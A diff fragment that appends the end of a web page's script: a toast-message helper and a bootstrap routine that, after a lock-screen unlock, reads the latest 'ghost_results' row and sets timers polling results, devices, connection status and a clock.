+// ═══════════════════════════════════════════════════════
+function showToast(msg) {
+  document.querySelector('.toast')?.remove();
+  const t = document.createElement('div');
+  t.className = 'toast'; t.textContent = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t?.remove(), 2500);
+}
+
+// ═══════════════════════════════════════════════════════
+//  BOOTSTRAP — called once after lock-screen unlock
+// ═══════════════════════════════════════════════════════
+let bootstrapped = false;
+async function bootstrap() {
+  if (bootstrapped) return;
+  bootstrapped = true;
+  try {
+    const rows = await dbSelect('ghost_results', 'order=id.desc&limit=1');
+    if (rows?.length) lastResultId = rows[0].id;
+  } catch(e) {}
+  checkConn();
+  pollDevices();
+  setInterval(pollResults,  2500);
+  setInterval(pollDevices, 10000);
+  setInterval(checkConn,   30000);
+  setInterval(updateClock,  1000);
+  updateClock();
+}
+</script>
+</body>
+</html>
